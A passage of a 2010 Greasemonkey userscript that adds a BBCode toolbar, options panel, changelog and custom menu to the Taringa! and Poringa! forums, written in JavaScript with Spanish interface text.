	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 21.0:</span></u></b><br>* Arreglados la mayoria de los host del link checker y agregados un par.<br>* Optimización de código.<br>* Script un poco más pesado pero de ejecución más rápida.<br>* Actualizador de comentarios. (BETA)<br>* Sección estilo post en las opciones, para comentar sobre el script.<br>* Administrador de emoticones.<br>* Agregados temas para el script. Pueden elegir dentro de una gama, el que más les guste.<br>* Agregada previsualización de fotos en el la sección Mis Fotos.<br>* [Fixed] Bug con el texto de los carteles de los botones del bbcoder.<br>* [Fixed] Bug con el texto en las opciones de imágenes.<br>* [Fixed] Varios bug mínimos que hacian que se cuelgue el script.<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 19.0:</span></u></b><br>* Nueva forma de actualizar el script.<br>* Arreglado el salto de linea de la barra de bbcode en mensajes.<br>* Nuevo menú de opciones.<br>* Iconos del menú configurables desde el menú y no se borrará al actualizar.<br>* Chat en las opciones.<br>* El administrador de post ahora carga la lista en forma descendente.<br><b><u><span style="color: red;">Changelog versión 18.0:</span></u></b><br>* Administrador de Posts.<br>* Arreglos varios.<br><b><u><span style="color: red;">Changelog versión 17.5:</span></u></b><br>* Configurable todas sus opciones.<br>* Agregado actualizador de posts.<br><b><u><span style="color: red;">Changelog versión 17.0:</span></u></b><br>* Compatibilidad Total con Taringa y Poringa Brasil.<br>* Pagina Principal con Post de Novatos a la Derecha.<br>* Mejora en aspecto varios.<br>* Nuevos botones para el Menu.<br>* Sin propaganda en la pagina principal.<br>* Nuevos Botones de Borrar y Editar tus post en tu perfil para tus ultimos post.<br>* Posibilidad de activar el asimilador de Poringa para dejarlo con el aspecto de Taringa.<br>* Escala de Grises en los colores.<br>* Optimizacion del codigo para una carga mas veloz.<br>* Arreglo de algunos host de archivos para el link checker.<br>* Buscador de Taringa por defecto.<br><b><u><span style="color: red;">Changelog versión 16.0:</span></u></b><br>* Arreglado el iconito de cerrar sesión.<br>* Agregado un link checker para unos 50 hosts de archivos echo en un 80% por mi.<br><b><u><span style="color: red;">Changelog versión 15.5:</span></u></b><br>* [Bug Fixed] Previsualizar Comentarios.<br>* [Bug Fixed] Al agregar Post de "Manga y Anime" se creaba como "Mac".<br>* [Bug Fixed] Emoticones que no se mostraban en mensajes al activar emoticones ocultos.<br>* Nueva forma más fácil de agregar nuevos iconos al código.<br>* Optimización del código.<br><b><u><span style="color: red;">Changelog versión 15.0:</span></u></b><br>* Compatibilidad total con Poringa.<br><b><u><span style="color: red;">Changelog versión 14.5:</span></u></b><br>* Arreglo general de la sección de edición, agregado y envio y respuesta de mensajes.<br>* Agregada barra de emoticones en edición, agregado y envio y respuesta de mensajes.  <img id="imagen" src="http://imgur.com/iV8UO.gif" border="0"> <br>* Compatibilidad total con funciones de edición y agregado de post.<br>* Mejorada la forma de previsualización.<br><b><u><span style="color: red;">Changelog versión 14.1:</span></u></b><br>* [Bug Fixed] Categoria Manga y Anime e icono.<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 14.0:</span></u></b><br>* Mejoras en aspectos. (?)<br>* Botón de "Agregar BBCode a todas las URL escritas"<br>* Nuevo lugar de descarga.<br>* Más opciones configurables.<br><b><u><span style="color: red;">Changelog versión 13.4:</span></u></b><br>* Nuevo aspecto del botón de Flash <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/swf.png" border="0"> y del botón de imagén <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/imagen.png" border="0"><br>* Nuevo botón para crear una imagén clickeable <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/imagen-click.png" border="0"><br>* Nuevo selector de categorías en creación y edición de post con las imagenes de cada categoría.<br><b><u><span style="color: red;">Changelog versión 13.3:</span></u></b><br>* Cambiar tamaño de los reproductores de eSnips a su tamaño original (328x94)<br>* Ahora también el cuadro de eSnips permite que se ponga el código HTML de la canción.<br><b><u><span style="color: red;">Changelog versión 13.2:</span></u></b><br>* Nuevo botón para ocultar y mostrar los emoticones.<br>* Los emoticones ahora están ocultos por defecto.<br><b><u><span style="color: red;">Changelog versión 13.1:</span></u></b><br>* [Bug Fixed] Redimensionamiendo de los reproductores de GoGear.<br><b><u><span style="color: red;">Changelog versión 13.0:</span></u></b><br>* Más iconos.<br>* Botón de Megavideo. <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/megavideo.png" border="0"><br>* Botón de GoEar. <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/goear.png" border="0"><br>* Más Fuentes.<br>* Más tamaños de letra.<br>* Nueva barra de colores en comentarios, con decenas de colores.<br>* Se cambia el tamaño de los reproductores de GoEar a su original (353x132)<br>* Se arreglo el problema con las dimensión de los SWF en los comentarios.<br>* Mejorada la captura de datos de los botones. Ejemplos en los botones de YouTube, Google, MegaVideo, GoEar, eSnips se puede poner cualquier tipo de info. Como sería la URL ó el Codigo HTML o directamente la ID que el script se encargara de generar el código correcto no importa lo que se ingrese.<br><b><u><span style="color: red;">Changelog versión 12.0:</span></u></b><br>* Nuevo aspecto de botones<br>* Botones comunes de formato <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/izquierdo.png" border="0"> <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/centrado.png" border="0"> <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/derecho.png" border="0"> <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/negrita.png" border="0"> <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/cursiva.png" border="0"> <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/subrayado.png" border="0"><br>(<b>Negrita</b>, <em>cursiva</em>, <u>subrayado</u>, alineación de texto[izq,cen,der])<br>* Menú desplegable para colores básicos.<br>* Menú desplegable para tamaños de fuete básicos.<br>* Menú desplegable para tipos de fuentes.<br>* Botones para reproductor de videos de YouTube y Google Videos. <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/youtube.png" border="0"> <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/google.png" border="0"><br>* Botón para reproductor de música eSnips. <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/esnips.png" border="0"><br>* Botones para arhivos flash "SWF", imagenes, links, quote. <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/swf.png" border="0"> <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/imagen.png" border="0"> <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/link.png" border="0"> <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/cita.png" border="0"><br>* Botón para preview de los comentarios. <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/preview.png" border="0"><br>* Cambio de botón para cerrar sesión.<br>* Botón para cerrar preview de comentario.<br>* Botones de "Ir a tierra" en el título del post y en el título de comentarios.<br>* Botonera de opciones para el post en agregar comentario. <br>(mensajes, favoritos, denuncia y puntaje)<br>* Menú de opciones para activar o desactivar muchas funciones del script.<br><b><u><span style="color: red;">Changelog versión 11.1:</span></u></b><br>* Arreglado bug con los videos de YouTube <span style="color: green;">(Gracias eloffset)</span><br><b><u><span style="color: red;">Changelog versión 11.0:</span></u></b><br>* Bueno la tan pedida barra de emoticones la eh finalizado.<br>Algunos iconos fueron cambiados de tamaño para no molestar. Esto no significa que en el comentario se vean chicos.<br><b><u><span style="color: red;">Changelog versión 10.8:</span></u></b><br>* Cambiado el tiempo de intervalo de actualización a 30seg ya que recibi varias quejas de que era muy rápido. Ahora hay tiempo suficiente para leerlo completo.<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 10.7:</span></u></b><br>* Actualizador automático de últimos comentarios en la página principal (Cada 10seg)<br>* Nuevo icono para reproducir canciones. <img id="imagen" src="http://i268.photobucket.com/albums/jj27/sharkale/taringa/esnips.png" border="0"><br><b><u><span style="color: red;">Changelog versión 10.6:</span></u></b><br>* Pequeña corrección que no aparecia la barra en crear nuevo mensaje privado <span style="position: relative;"><img src="http://i.t.net.ar/images/big2v5.gif" style="position: absolute; top: -574px; clip: rect(572px, 16px, 588px, 0px);"><img src="http://i.t.net.ar/images/space.gif" style="width: 16px; height: 12px;"></span><br><b><u><span style="color: red;">Changelog versión 10.5:</span></u></b><br>* Cambio de la barra en agregar post, mensajes privado y comentarios.<br>* Agregado botón de Google Videos.<br>* Mejorados los selectores de YouTube y Google Videos permitiendo ingresar cualquier referencia del video como la URL, el codigo HTML o la ID que devolverá un BBCode válido para dicho video.<br>* Mejorados los BBC de los demás botones, como posibilidad de agregarle el una etiqueta a una URL o que directamente ponga el BBC a una URL seleccionada, a una URL de una imágen, una URL a un texto seleccionado y demás.<br>* Previsualización del tipo de fuente en el selector.<br>* Achicado el volúmen de la barra para prevenir el desborde de los que tienen baja resolución.<br><b><u><span style="color: red;">Changelog versión 10.1:</span></u></b><br>* Para todos los que molestaron con la [X] de cerrar sesión. (@#$%&amp;#)<br><b><u><span style="color: red;">Changelog versión 10.0:</span></u></b><br>* Mejoradas las funciones de los botones de video de youtube, flash, imagenes, url y quote.<br>* Ahora la URL puede ponerse a un texto seleccionado o solo la URL.<br>* En los videos de YouTube ya no hay 2 iconos, sino que ahora pregunta si es o no de alta definición.<br>* Agregado el botonocito de cerrar previsualizacion.<br>* Agregado vinculo "Ir a la Tierra" en el titulo de los comentarios<br><b><u><span style="color: red;">Changelog versión 9.8:</span></u></b><br>* Compatibilidad con la nueva barra T!.<br><b><u><span style="color: red;">Changelog versión 9.7:</span></u></b><br>* Desactivo momentaneamente las barras de BBC porque Taringa va a poner en funcionamiento la nueva barra, la cual no es compatible con mi script. Luego del lanzamiento vere que hago con el script. si vale o no la pena mejorarlo. No me llenen la casilla con MP ¬¬<br><b><u><span style="color: red;">Changelog versión 9.6:</span></u></b><br>* Agregados botones de Enviar, Favoritos y Denunciar en comentario.<br><b><u><span style="color: red;">Changelog versión 9.5:</span></u></b><br>* A pedido de muchos agregado el botón de Quote<br>Y un pequeñito enlace a mi post arriba a la dereca en el menú <span style="position: relative;"><img src="http://i.t.net.ar/images/big2v5.gif" style="position: absolute; top: -332px; clip: rect(330px, 16px, 346px, 0px);"><img src="http://i.t.net.ar/images/space.gif" style="width: 16px; height: 12px;"></span> <span style="position: relative;"><img src="http://i.t.net.ar/images/big2v5.gif" style="position: absolute; top: -332px; clip: rect(330px, 16px, 346px, 0px);"><img src="http://i.t.net.ar/images/space.gif" style="width: 16px; height: 12px;"></span> <br><b><u><span style="color: red;">Changelog versión 9.0:</span></u></b><br>* Agregado al comentario una barrita para poner los puntos desde ahi. <br>¡¡¡Todavía está BETA!!!<br>* Pude poner el "Ir a la Tiera" en la derecha jaja<br><b><u><span style="color: red;">Changelog versión 8.3:</span></u></b><br>* Arreglados combobox y fuentes.<br><b><u><span style="color: red;">Changelog versión 8.2:</span></u></b><br>* Alguien que otro bugsito en las fuentas y el tamaño. <br><b><u><span style="color: red;">Changelog versión 8.1:</span></u></b><br>* Le saque el loguito de navidad <span style="position: relative;"><img src="http://i.t.net.ar/images/big2v5.gif" style="position: absolute; top: -574px; clip: rect(572px, 16px, 588px, 0px);"><img src="http://i.t.net.ar/images/space.gif" style="width: 16px; height: 12px;"></span><br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 8.0:</span></u></b><br>* Mejoras en el script. Ahora con autoactualizador.<br><b><u><span style="color: red;">Changelog versión 7.5:</span></u></b><br>* Arreglado el problema con los videos en los comentarios <span style="position: relative;"><img src="http://i.t.net.ar/images/big2v5.gif" style="position: absolute; top: -310px; clip: rect(308px, 16px, 324px, 0px);"><img src="http://i.t.net.ar/images/space.gif" style="width: 16px; height: 12px;"></span><br><b><u><span style="color: red;">Changelog versión 7.0:</span></u></b><br>* Ahora el script es compatible con Poringa! <br><b><u><span style="color: red;">Changelog versión 6.0:</span></u></b><br>* Varias Mejoras encuanto a los comentarios la barra, interface y preview de los comentarios.<br><b><u><span style="color: red;">Changelog versión 5.5:</span></u></b><br>* Cambiado el formato de como creaba la barra de BBCodes, haber si ahora se les soluciona el problema que tienen algunos que no le aparecen bien los iconos.<br><b><u><span style="color: red;">Changelog versión 5.2:</span></u></b><br>* Para todos a los que se les ve mal la nueva versión y a los que no tambien. Bajen esta versión donde eh achicado el texto en los combos para que ocupe menos espacio.<br><b><u><span style="color: red;">Changelog versión 5.1:</span></u></b><br>* Arreglada la imagen que estaba en portugues <span style="position: relative;"><img src="http://i.t.net.ar/images/big2v5.gif" style="position: absolute; top: -354px; clip: rect(352px, 16px, 368px, 0px);"><img src="http://i.t.net.ar/images/space.gif" style="width: 16px; height: 12px;"></span><br><b><u><span style="color: red;">Changelog versión 5.0:</span></u></b><br>* Agregado el preview beta de comentarios que se mejorara pronto.<br><b><u><span style="color: red;">Changelog versión 4.5:</span></u></b><br>* Mejorados los reproductores de video. Aca les dejo una muestra. Aparte de la combinacion de colores con taringa.<br><b><u><span style="color: red;">Changelog versión 4.0:</span></u></b><br>* Bueno eh cambiado la barra de bbcodes en "Agregar post" y "Edicion de post" y tambien no permitiendo que este se mueva hacia arriba cuando se agrega uno de los emoticones de abajo o con cualquier bbcode.<br>* Y tambien cambie el signito de taringa por uno más modernito que hice <span style="position: relative;"><img src="http://i.t.net.ar/images/big2v5.gif" style="position: absolute; top: -354px; clip: rect(352px, 16px, 368px, 0px);"><img src="http://i.t.net.ar/images/space.gif" style="width: 16px; height: 12px;"></span><br><b><u><span style="color: red;">Changelog versión 3.5:</span></u></b><br>* Le agregue un link para ir al fondo de la página en los post <span style="position: relative;"><img src="http://i.t.net.ar/images/big2v5.gif" style="position: absolute; top: -574px; clip: rect(572px, 16px, 588px, 0px);"><img src="http://i.t.net.ar/images/space.gif" style="width: 16px; height: 12px;"></span> para los que le jode usar la barra o mantener el boton de RePág apretado.<br><b><u><span style="color: red;">Changelog versión 3.0:</span></u></b><br>* Agregado el BBCode para videos de youtube. Con la posibilidad de reproducir videos de alta calidad.<br><b><u><span style="color: red;">Changelog versión 2.0:</span></u></b><br>* Cuando se utilizan las opciones para dar formato al texto sucede exactamente lo mismo que cuando uno va a <em>Agregar</em> y a hacer un post: si, por ejemplo, pongo <b>negrita</b>, <b>automáticamente, el texto se mueve hacia arriba, con lo que hay que buscar la parte última en la que se insertó el código</b> haciendo un poco incómodo la insersión de un post o comentario.<br>* La version 2 del script. Ahora ya no sucede esto, es más, el texto seleccionado al que le damos formato sigue seleccionado para poder seguir agregandole BBC sin necesidad de volverlo a seleccionar.<br>Y cuando no se selecciono texto, la posición del cursor se situa justo donde tenemos que ingresar los datos del BBC.<br>* Tambien arregle el campo de texto que se desbordaba un poco de la interface. Achicandolo a el tamaño ideal.<br><b><u><span style="color: red;">Changelog versión 1.0:</span></u></b><br>* Bueno cansado de cada vez que le quiero poner algo a algun comentario escribir los BBC, eh escrito este script que introduce la botonera de BBCodes. Como no esta en la misma página de crear un post no puedo hacer un "copy-paste" asi que diseñe todas las funciones en el script para poder ingresar estos BBC dentro del cuadro de texto.<br>* Como me gusto como ah quedado me gustaría compartirlo con ustedes.<br>* Antes que nada pueden ver el código antes de instalarlo y verificar que no tiene nada malisioso. Igual si no entienden mucho de JavaScript les doy la palabra que no hace nada malo. O lo podría revisar algun miembro de Taringa para darle el OK.';
	nuevaHTML += '</b></div>';
	nuevaHTML += '<div id="opciones-6"><b>';
	nuevaHTML += '    <div class="ui-state-error ui-corner-all" style="padding: 0pt 0.7em;"><p><span class="ui-icon ui-icon-alert" style="float: left; margin: 0.3em 0.3em;"></span><span style="font-size: 14px;">Si queres donar por medio de PayPal mandame MP y te digo a que cuenta transferir <a href="http://www.taringa.net/mensajes/a/Sharkale"><img src="https://www.paypal.com/es_ES/ES/i/btn/btn_donate_LG.gif" align="absmiddle" alt="PayPal. La forma rápida y segura de pagar en Internet."></a></span></p></div>';
	nuevaHTML += '    <div style="float:left;"><img src="'+urlimg+'bienvenida.png" alt=""/></div>';
	nuevaHTML += '    <div style="float:right;"><img src="'+urlimg+'bienvenida.png" alt=""/></div>';
	nuevaHTML += '    <div align="center"><br><span style="font-size:15px">BBCoder para Taringa! y Poringa! por:</span><br/><br/><br/>';
	nuevaHTML += '    <span style="font-size:30px;font-family:Arial Black">Sharkale® 2010</span><br/><br/><br/>';
	nuevaHTML += '    <span style="font-size:15px;">Versión instalada actualmente: '+ultversion+'</span><br/><br/>';
	nuevaHTML += '    <img src="http://img64.imageshack.us/img64/7744/2e2nxjb.gif" alt=""/><br><br>';
	nuevaHTML += '    <div class="ui-state-error ui-corner-all" style="padding: 0pt 0.7em;"><p><span class="ui-icon ui-icon-alert" style="float: left; margin-right: 0.3em;"></span><strong>Alerta:</strong> Si sos moderador te la comes doblada. Y si estas buscando como contactarme para criticar algo del script te podes ir bien a la casilla de mensajes y escribirme. =D</p></div><br/>';
	nuevaHTML += '    <hr>Agradecimientos<br><input type="button" class="ui-state-default ui-corner-all" title="Mis agradecimientos a acatengoqueponerminick" value="acatengoqueponerminick">';
	nuevaHTML += '    <input type="button" class="ui-state-default ui-corner-all" title="Mis agradecimientos a EternamenteCiego" value="EternamenteCiego">';
	nuevaHTML += '    <input type="button" class="ui-state-default ui-corner-all" title="Mis agradecimientos a Carancho09" value="Carancho09">';
	nuevaHTML += '    <hr><input type="button" value="Reportar un Bug en el Script" id="Btn_Reportar_Bug" title="Reportar un Bug en el Script" class="ui-state-default ui-corner-all"/>';
	nuevaHTML += '    <input type="button" value="Ayudar con una Sugerencia para el Script" id="Btn_Reportar_Sugerencia" title="Reportar una Sugerencia para el Script" class="ui-state-default ui-corner-all"/>';
	nuevaHTML += '    </div>';
	nuevaHTML += '</b></div>';
	nuevaHTML += '</div>';
	//nuevaHTML += '    ';
	$('#cuerpocontainer').hide();
	if($('#widget').size() == 0) $('#cuerpocontainer').before(widget+nuevaHTML+'</div>'); else $('#widget').html(nuevaHTML);
	$('#SharkaleOpciones').show();
	$("#tabs, #tabsOpciones").tabs();
	try{$('#switcher').themeswitcher();}catch(e){};

	$('#miarrobatag207890').attr('src','http://tagboard.miarroba.com/mostrarmensajes.php?id=207890');
	if(user){ 
		$('#miarrobatag207890_nick').attr('value', (user.length > 20? user.substr(0,20):user));
	}else{
		$('#miarrobatag207890_submit').attr('disabled', 'true');
		$('#miarrobatag207890_submit').addClass('ui-state-disabled');
		$('#miarrobatag207890_submit').attr('value', 'Debes logearte en la página antes de utilizar el tagboard!');
	}
	
	$(':button[class*="ui-state-default"],:submit[class*="ui-state-default"]').hover(
		function() { $(this).addClass('ui-state-hover'); }, 
		function() { $(this).removeClass('ui-state-hover'); }
	);
	
	$('#tb_msg').focus(function() {
		if($('#tb_msg').val() == 'Tu mensaje aquí')
			$('#tb_msg').val('');
	});
	$('#tb_msg').blur(function() {
		if($('#tb_msg').val() == '')
			$('#tb_msg').val('Tu mensaje aquí');
	});
	
	$('#Btn_CambiarTheme').click(function() {
		if(CambiarTheme){
			$('div[class="ui-widget-overlay"]').remove();
			$('div[aria-labelledby="ui-dialog-title-SharkaleOpciones"]').remove();
			Cambiar_Theme();
		}else alert('Tienes desactivado el cambiador de theme. Activalo primero.');
	});
	
	$('#Btn_Guardar_Opciones').click(function() {Guardar_Opciones()});
	$('#Btn_Guardar_Imagenes').click(function() {Guardar_Imagenes()});
	$('#Btn_Restablecer_Imagenes').click(function() {Restablecer_Imagenes()});
	$('#Btn_Restablecer_Imagenes_T').click(function() {Restablecer_Imagenes_T()});
	$('#Btn_Reportar_Bug').click(function() {GM_openInTab('http://www.taringa.net/comunidades/bbcoder/125800/')});
	$('#Btn_Reportar_Sugerencia').click(function() {GM_openInTab('http://www.taringa.net/comunidades/bbcoder/125814/')});
	$('#Btn_Agregar_Emoticones').click(function() {Agregar_Emoticones()});
	$('#Btn_Guardar_Emoticones').click(function() {Guardar_Emoticones()});
	$('#Btn_Reestablecer_Emoticones').click(function() {Reestablecer_Emoticones()});
	$('#Btn_Exportar_Emoticones').click(function() {Exportar_Emoticones()});
	$('#Btn_Importar_Emoticones').click(function() {Importar_Emoticones()});
	$('#Btn_Importar_Pack_Emoticones').click(function() {Importar_Emoticones(true)});
	$('#Btn_Crear_Pack_Emoticones').click(function() {GM_openInTab('http://www.sharkale.com.ar/bbcoder/index.php?id=emot_crear')});
	$('#Btn_Chat').click(function() {GM_openInTab("http://www.everywherechat.com/everywherechat.swf?defaultRoom=sharkale_radio&fontSize=12&roomList=false&theme=night")});

	$.get('http://tagboard.miarroba.com/ver.php?id=207890');
};

function modificar_posts(){
	$('embed[oculto!=true]').wrap('<div class="oculto"><div style="border:1px inset;margin:3px 0;padding:6px;"><span style="display:'+(aSWF && aSWFhide? 'none':'block')+';"></span></div></div>');
	$('embed[oculto!=true]').attr('oculto','true').parent().parent().parent().parent().prepend('<input class="button" type="button" value="Mostrar/Ocultar Archivo Flash" onclick="$(this).parent().find(\'div span\').toggle(\'show\');return false;"/>');
	$('embed').attr('allowfullscreen','true').attr('allowscriptaccess','always');
	if(aSWF == true){
		if(path == 'comunidades'){
			$('embed:not([src^="http://www.youtube.com"])').attr('height','485').attr('width','600');
			$('embed[src*="www.goear.com"]').attr('height','132').attr('width','353');
			$('embed[src*="www.esnips.com"]').attr('height','169').attr('width','372');
		}else{
			$('embed:not([src^="http://www.youtube.com"])').attr('height','485').attr('width','700');
			$('embed[src*="www.goear.com"]').attr('height','132').attr('width','353');
			$('embed[src*="www.esnips.com"]').attr('height','169').attr('width','372');
		}
	}
	var src = '';
	var emb = $('embed[modif!=true]');
	for(var i=0; i< emb.size();i++){
		src = emb.eq(i).attr('src');
		var theme = eval(GM_getValue('theme'+(Tar? '':'Por'),'({borde:"#CCCCCC"})')).borde.replace(/#/,'');
		if(/^http:\/\/www.youtube.com/.exec(emb.eq(i).attr('src'))){
			emb.eq(i).attr('src',src+'&fs=1&color2=0x'+theme).attr('modif','true');
		}else{
			emb.eq(i).attr('src',src).attr('modif','true');
		}
	}
}
// ==/Funciones que serán agregadas a la página==
if(path != 'buscador-ext'){
///////////////------------------Cambiar Iconos--------------------////////////////////
if(CambiarTheme) addStyle(eval(GM_getValue('theme'+(Tar? '':'Por'),'({fondofuera:"#000000", borde:"#480C0C", fondodentro:"#BBBBBB", fondopost:"#CCCCCC" })')));

if($("a[class='iniciar_sesion']").size() == 0){

var newCSS  = '.menuTabs{width:400px;background:none;}#menu{background:url("http://i.t.net.ar/images/bgLogged.gif") repeat-x scroll 0 0 #CCCCCC}';
	newCSS += '#tabbedPosts.here {-moz-border-radius-topleft:6px}.subMenu{position:absolute;}';
	newCSS += '.opciones_usuario {-moz-border-radius-topright: 7px;}';
	newCSS += '.userInfoLogin {background: none;}.userInfoLogin img {margin: 0;}.userInfoLogin a {padding: 3px 7px;}';
	newCSS += '.tMenu {font: 12px arial;z-index:1000;text-align:center;color:#000000;-moz-border-radius-topright: 7px;}';
    newCSS += '.tMenu, .tMenu ul {padding: 0; margin: 0; list-style: none inside none;}';
	var pad = 0;
	switch(MenuSize){
		case "23":pad=1;break;
		case "21":pad=2;break;
		case "19":pad=3;break;
		case "17":pad=4;break;
		case "15":pad=5;break;
	}
    newCSS += '.tMenu li {list-style: none outside none;border-left: 1px solid #DCDCDC;border-right: 1px solid #717171;line-height: '+MenuSize+'px; padding:'+pad+'px 0px;}';
    newCSS += '.tMenu li .tSubMenu {line-height: 1.50em; position : absolute; left: -999em; margin-left : 0px; margin-top : -1px; width:175px;background-color:#C3C0C0;border:2px solid #777777;z-index:1001}';
    newCSS += '.tMenu li .tSubMenu li{padding: 0;line-height : 1.50em; width:175px;background:url("http://i.t.net.ar/images/bgLogged.gif") repeat-x scroll 0 0 #FFFFFF;border-top:1px solid #777777;}';
    newCSS += '.tMenu li .tSubMenu ul {left: -999em;}';
	newCSS += '.tMenu li .tSubMenu li ul {margin-left: 170px;margin-top : -20px;}';
    newCSS += '.tMenu li a { display : block; font-weight : bold; text-decoration : none;}';
    newCSS += '.tMenu li a:hover {color:#0082BE;}';
    newCSS += '.tMenu li:hover .tSubMenu ul, .tMenu li:hover .tSubMenu ul ul {left: -1999px;z-index:1002}';
    newCSS += '.tMenu li:hover .tSubMenu, .tMenu li .tSubMenu li:hover ul, .tMenu li .tSubMenu li li:hover ul {left: auto;background-color:#fff;z-index:1002}';
	newCSS += '.tMenu li .tSubMenu li:hover{left: autopx;background-color:#D2D2D2;z-index:1003}';
	newCSS += '#subMenuScript.subMenu {background: url(http://i.t.net.ar/images/shadowSubMenu.png) #880000 repeat-x scroll left top;border: none;border-left: 1px solid #500000;border-right: 1px solid #500000;}';
	newCSS += '#subMenuScript.subMenu ul.tabsMenu li {background: #AA0000;}';
	newCSS += '#subMenuScript.subMenu ul.tabsMenu li:hover {background: #FF0000;}';
	newCSS += '.notificaciones-list {display: none;background: #FFF!important;position: absolute!important;z-index: 300!important;width: 300px!important;text-align: left!important;font-weight: normal!important;color: #444!important;-moz-box-shadow: 5px 5px 5px rgba(0, 0, 0, 0.5)!important;border-left: 0px solid #CCC!important;border-bototm:1px solid #CCC!important;border-right:1px solid #CCC!important;}';
	newCSS += '.notificaciones-list ul {max-height:250px!important;overflow-y:auto!important;padding: 0 10px!important;margin: 5px 0!important;}';
	newCSS += '.notificaciones-list ul li:hover {background-color: #F7F7F7!important;}';
	newCSS += '.userInfoLogin ul li div.notificaciones-list ul li {display: block!important;border-top: 1px solid #EEE!important!important;float: none!important;padding:5px 3px!important;border: none!important;line-height: 18px!important;margin: 0!important;}';
	newCSS += '.userInfoLogin ul li div.notificaciones-list ul li:hover {cursor: pointer!important;}';
	newCSS += '.userInfoLogin li div.notificaciones-list ul li.unread {background-color: #FFFFCC!important;}';
	newCSS += '.userInfoLogin .alertas{line-height:14px;}.userInfoLogin .alertas a:hover{color:#FFF;text-decoration:none;}';
	newCSS += 'li.monitor-notificaciones {background: #FFF!important;}';
	newCSS += '.userInfoLogin ul li div.notificaciones-list ul li a {display: inline!important;width: auto!important;height: auto!important;margin: 0!important;color: #007394!important;padding: 0!important;border-right: none!important;font-weight: bold!important;text-shadow: none!important;}';
	newCSS += '.userInfoLogin ul li div.notificaciones-list ul li a:hover {text-decoration: underline!important;}';
	newCSS += '.ver-mas {display: block!important;padding: 6px!important;text-align: center!important;background: #EEE!important;font-weight: bold!important;text-shadow: none!important;color: #0f385b!important;border-top: #CCC 1px solid!important;}';
	newCSS += '.ver-mas:hover {background: #a7d1f5;color: #010b13;text-shadow: none;border-top: #000;border-top: 1px solid #5a93c3;}';
	GM_addStyle(newCSS);

	var menu = '<div class="userInfoLogin">';
	menu += '<ul class="tMenu">';
//----Actualizar----//
	menu += '	<li id="MenuAct" style="display:none;"><a href="" id="Sharkale_Actualizar" title="Hay una nueva versión disponible del Script" style="text-decoration:blink;"><img src="'+MenuActualizacion+'" style="width: '+MenuSize+'px; height: '+MenuSize+'px;" align="absmiddle" /></a></li>';
//----Online/Offline----//
	menu += '	<li id="MenuMonitor"><a href="#" id="Menu_Monitor_Posts" title="Monitor de Posts"><img id="imgonlineoffline2" src="'+MenuOnlineOffline+'" style="width: '+MenuSize+'px; height: '+MenuSize+'px;" align="absmiddle" /></a></li>';
//----Online/Offline----//
	menu += '	<li id="MenuOnlineOffline" "><a href="#" id="Menu_Online_Offline" title="Mostrar mi estado cuando navego el sitio"><img id="imgonlineoffline" src="'+MenuOnlineOffline+'" style="width: '+MenuSize+'px; height: '+MenuSize+'px;" align="absmiddle" /></a></li>';
//----Inicio----//
	menu += '	<li><a href="http://'+Dom+'" title="Inicio"><img src="'+MenuTaringa+'" align="absmiddle" style="width: '+MenuSize+'px; height: '+MenuSize+'px;" align="absmiddle"  alt="Inicio" border="0"/></a>';
    menu += '	<ul class="tSubMenu"><b>Taringa!</b>';
    menu += '		<li><a href="/agregar/" title="">Agregar Post</a></li>';
    menu += '		<li><a href="/top/">Tops</a></li>';
    menu += '		<li><a href="/chat/">Chat</a></li>';
    menu += '		<li><a href="http://ayuda.itaringa.net/">Ayuda y FAQs</a></li>';
	menu += '		<li><a href="/buscador-taringa.php">Buscador</a></li>';
	menu += '		<li><b>Busqueda Rápida en T! o P!</b><form method="get" action="http://'+Dom+'/posts/buscador/taringa/"><input name="q" title="Buscador Rápido" style="border: 0px none; font-size: 10px; width:171px;padding-bottom:2px;" type="text"></form></li>';
	menu += '		<li><b>Busqueda Rápida en Google</b><form method="get" action="http://www.taringa.net/posts/buscador/google/" onsubmit="$(\':input[name=q3]\').attr(\'name\',\'q2\').val($(\':input[name=q][title*=Google]:last\').val())"><input name="q" title="Buscador Rápido en Google" style="border: 0px none; font-size: 10px; width:171px;padding-bottom:2px;" type="text"><input type="hidden" name="q3" value=""><input type="hidden" name="cof" value="FORID:10"><input type="hidden" name="cx" value="partner-pub-5717128494977839:h5hvec-zeyh"></form></li>';
	menu += ' 	    <li><a href="http://status.itaringa.net/">Ir a Blog Status</a></li>';
	menu += '		<li><a href="/juegos/">Juegos</a></li>';
	menu += '		<li><a href="/protocolo/">Protocolo</a></li>';
	menu += '		<li><a href="/denuncia-publica/">Denunciar</a></li>';
	menu += '		<li><a href="http://br.taringa.net/">T! em Português</a></li>';
    menu += '	</ul>';
	menu += '	</li>';
//----Mensaje----/
	var Mensajes = $('a[href="/mensajes/"]:first').is(':has(span)');
